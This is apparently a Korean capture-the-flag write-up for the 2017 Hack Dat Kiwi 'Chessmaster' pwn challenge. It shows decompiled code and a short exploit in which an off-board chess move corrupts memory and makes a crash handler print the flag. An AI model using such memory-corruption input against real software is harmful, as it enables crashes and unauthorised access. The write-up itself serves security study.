# [2017_Hack_Dat_Kiwi] \[PWN] Chessmaster

## Analysis

```c
void __fastcall __noreturn handler(int a1)
{
  int c; // [rsp+14h] [rbp-Ch]
  _IO_FILE *fp; // [rsp+18h] [rbp-8h]

  if ( a1 == 11 )
  {
    printf("Flag is: ");
    fp = fopen("flag-half.txt", "r");
    if ( fp )
    {
      while ( 1 )
      {
        c = _IO_getc(fp);
        if ( c == -1 )
          break;
        putchar(c);
      }
      fclose(fp);
    }
    else
    {
      puts("Could not open file");
    }
  }
  exit(0);
}
```

handler라는 함수에서 플래그를 출력해줍니다.

아래 코드를 보면 알겠지만 handler 함수는 memory corruption이 일어날 때 트리거됩니다.

```c
void __noreturn sub_40219A()
{
  __int64 coordinates; // [rsp+0h] [rbp-60h]
  __int64 v1; // [rsp+8h] [rbp-58h]
  char v2; // [rsp+10h] [rbp-50h]
  int (*print_board)(); // [rsp+50h] [rbp-10h]
  int mv_input; // [rsp+5Ch] [rbp-4h]

  signal(11, (__sighandler_t)handler);
  puts("Welcome. This is a super chess where pieces are swapped instead of removed.");
  puts("Turns will toggle between white and black.\nThe following input formats are accepted:");
  puts("  9: print board\n  777: exit\n  x,y u,w: move piece at x,y to u,w\nGood luck!\n-----------");
  print_board = print_board_401053;
  board_status_604180 = (__int64)&v2;
  sub_40113A("  9: print board\n  777: exit\n  x,y u,w: move piece at x,y to u,w\nGood luck!\n-----------", handler);
  print_board();
  while ( 1 )
  {
    while ( 1 )
    {
      if ( turn_604168 == 1 )
        printf("WHITE: ");
      else
        printf("BLACK: ");
      putchar(10);
      mv_input = input_401E3A(&coordinates);
      if ( mv_input )
        break;
      puts("Invalid move input");
    }
    if ( mv_input == 2 )
    {
      ((void (__fastcall *)(__int64 *))print_board)(&coordinates);
    }
    else
    {
      if ( mv_input == 3 )
      {
        puts("GG");
        exit_402431(0LL);
      }
      if ( mv_input == -1 )
        exit_402431(0LL);
      if ( (unsigned int)move_401782(coordinates, v1) )
      {
        puts("Ok!");
        turn_604168 = turn_604168 != 1;
      }
      else
      {
        puts("No!");
      }
    }
  }
}
```

바이너리를 분석해서 crash를 발생시켜야 합니다.

```
Welcome. This is a super chess where pieces are swapped instead of removed.
Turns will toggle between white and black.
The following input formats are accepted:
  9: print board
  777: exit
  x,y u,w: move piece at x,y to u,w
Good luck!
-----------
  01234567
7 rhbqkbhr
6 pppppppp
5 ........
4 ........
3 ........
2 ........
1 PPPPPPPP
0 RHBQKBHR
WHITE: 
```

프로그램을 실행시키면 위와 같이 체스 보드가 나타나게 됩니다. (하지만 저는 체스의 룰을 모르기 때문에 `PRHBQKBHR`이 무엇을 의미하는지 전혀 몰랐습니다. 문제를 풀고보니 체스의 말이었다는…)

8*8 형식의 보드인데, 이를 벗어나게끔 하여 말을 움직이면 크래시가 발생할 듯 싶었습니다.(저는 로직을 분석하면서 체스의 룰을 알게 되었습니다 ㅂㄷㅂㄷ...)

로직의 조건을 끼워맞춰주면서 6,0에 있는 말을 8,1로 이동시킬 수 있다는 점을 알게 되었습니다. 말을 이동시킨 후, 보드를 출력하면 크래쉬가 발생합니다.

## Exploit

```
# nc 0 2004
Welcome. This is a super chess where pieces are swapped instead of removed.
Turns will toggle between white and black.
The following input formats are accepted:
  9: print board
  777: exit
  x,y u,w: move piece at x,y to u,w
Good luck!
-----------
  01234567
7 rhbqkbhr
6 pppppppp
5 ........
4 ........
3 ........
2 ........
1 PPPPPPPP
0 RHBQKBHR
WHITE: 
6,0 8,1
Ok!
BLACK: 
9
Flag is: Could not open file
```

